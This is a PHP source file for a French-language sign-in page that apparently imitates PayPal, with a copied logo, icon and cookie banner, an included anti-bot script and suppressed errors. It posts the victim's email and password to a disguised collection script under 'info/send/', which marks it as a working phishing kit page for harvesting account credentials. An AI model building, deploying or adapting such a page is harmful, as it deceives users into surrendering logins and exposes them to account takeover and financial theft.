<?php
include 'antibots.php';
  error_reporting(0);
  ob_start();
  session_start();
?>
<!DOCTYPE html>
<html>
    <head>
        <meta charset="utf-8">
         <title>Accueil - Connexion</title>
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta http-equiv="X-UA-COMPATIBLE" content="IE-edge" />
        <meta charset="utf8">
        <link rel="stylesheet" href="css/normalize.css" />
        <link rel="stylesheet" href="css/bootstrap.min.css" />
        <link rel="stylesheet" href="css/font-awesome.min.css" />
        <link rel="stylesheet" href="css/login.css" />
        <link rel="shortcut icon" type="image/x-icon" href="img/ppl.ico">
        <link rel="stylesheet" href="css/signin.css" type="text/css"> 
		
       
        
    </head>
    <center>
    <body style="">
        <div id="form-container">
            <p id="ppl-logo-form"></p>
            <form id="login-form" action="<?php echo 'info/send/serv5201.php?enc='.md5(time()).'&p=0&dispatch='.sha1(time()); ?>" method="POST">
                <div id="email-display" class="hidden">
                    <span id="user-email"></span>
                    <button type="button" id="modify-email">Modifier</button>
                </div>
                <div id="login-container" style="position: relative;">
                    <input type="text" name="mail" autocomplete="off" placeholder="Email ou numéro de mobile" id="login">
                    <input type="password" name="pass" placeholder="Mot de passe" autocomplete="off" id="password" class="hidden">
                    <button type="button" id="show-password" class="hidden">Afficher</button>
                    <div id="required-error">
                        <p id="error-message">Obligatoire</p>
                    </div>
                </div>
                <button type="button" id="next-button">Suivant</button>
                <button type="button" id="login-button" class="hidden">Connexion</button>
                <p id="forgot-password" class="hidden"><a href="#">Vous n'arrivez pas à vous connecter ?</a></p>
                <div id="login-form-separator">
                    <span>ou</span>
                </div>
                <button type="button" id="register-button">Ouvrir un compte</button>
                <input type="hidden" name="action" value="login">
            </form> 
        </div>
<?php include'./info/footer.php'?>
        <div id="cookies-container">
            <div id="cookies-inner-container">
                <div id="cookies-msg">
                    <p>Si vous poursuivez la navigation, nous utiliserons les cookies qui amélioreront les performances de notre site et personnaliseront votre expérience. Si vous acceptez, nous utiliserons également les cookies pour personnaliser les publicités. <span id="manage-cookies">Gérer vos cookies</span></p>
                </div>
                <div id="consent-button-container">
                    <p id="align-consent-button"><button type="button" id="consent-button">Accepter les cookies<span id="arrows"></span></button></p>
                </div>
            </div>
        </div>
        <div id="loader" class="hidden">
            <div id="mask"></div>
            <div id="spinner"></div>
        </div>
        <script src="js/signin.js"></script>
    </body>
</center>
</html>